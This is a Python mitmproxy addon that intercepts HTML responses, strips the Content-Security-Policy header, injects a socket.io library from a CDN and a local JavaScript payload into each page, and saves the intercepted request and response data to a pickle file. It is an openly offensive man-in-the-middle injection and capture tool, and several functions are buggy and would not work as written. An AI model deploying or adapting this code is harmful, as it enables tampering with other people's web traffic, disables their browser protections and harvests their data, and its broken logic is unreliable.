from mitmproxy import ctx
import dataframing
from bs4 import BeautifulSoup   # nice representation of the DOM
import pandas as pd
import pickle
import time


def appendPickle(data):
	df1 = pd.read_pickle("./pickles/data.pickle")
	df = pd.DataFrame().from_dict(data)
	df.columns = df1.columns
	l = len(df) + len(df1)
	df.append(df1, index=[0])
	df.to_pickle("./pickles/data.pickle")
	ctx.log.info("saved")


def saveData(flow):
	flow_dict = vars(flow)
	data = {}

	# try:
	# 	df = pd.read_pickle('./pickles/data.pickle')
	# except:
	# 	df = pd.DataFrame()
	# data = {}
	for item in flow_dict:
		key = str(item)
		value = str(flow_dict[key])
		ctx.log.info(f"key: {key}")
		ctx.log.info(f"value: {value}")
		while len(value) > 500:
			value = BeautifulSoup(value, features = "html.parser")
			for key in value:
				value = str(value[key])
		else:
			data[key] = value

		appendPickle(data)

		

	
def response(flow):
	ctx.script = "./js/alert.js"
	if flow.request.host in ctx.script:
		return  # Make sure JS isn't injected to itself
	html = BeautifulSoup(flow.response.content, features = "html.parser")
	if html.body and ("text/html" in flow.response.headers["content-type"]):     # inject only for HTML resources
		# delete CORS header if present
		if "Content-Security-Policy" in flow.response.headers:
			del flow.response.headers["Content-Security-Policy"]
		# inject SocketIO library from CDN
		cdn = html.new_tag("script", type="text/javascript", src="//cdnjs.cloudflare.com/ajax/libs/socket.io/1.3.6/socket.io.min.js")
		html.body.insert(0, cdn)
		script = html.new_tag("script", type="application/javascript")
		script.insert(0, read_file(ctx.script))
		html.body.insert(1, script)
		flow.response.text = str(html)
		ctx.log.info("script injected")
		saveData(flow)
		



		

def read_file(filename):
	with open(filename) as f:
		return f.read()
